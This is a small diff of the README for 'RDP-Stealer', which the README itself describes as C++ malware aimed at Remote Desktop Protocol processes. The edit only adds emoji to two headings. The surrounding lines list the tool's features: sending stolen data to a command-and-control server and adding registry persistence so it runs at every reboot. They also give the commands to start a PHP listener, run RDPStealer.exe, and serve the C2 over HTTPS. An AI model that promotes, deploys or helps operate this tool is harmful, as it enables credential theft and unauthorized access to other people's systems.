@@ -8,7 +8,7 @@ The RDP-Stealer is C++ malware that targets Remote Desktop Protocol (RDP) proces
 - Sends data to a C2 server.
 - Modifies the registry to auto-execute at every reboot.
 
-## TODO
+## TODO 🚧
 - Add Schedule Task
 - Add Banner
 
@@ -23,7 +23,7 @@ php -S 0.0.0.0:8000
 ```bash
 .\RDPStealer.exe
 ```
-> Note
+> Note ⚠️
 - It is better to use an `HTTPS server` instead of an `HTTP server`.
 
 ## POC
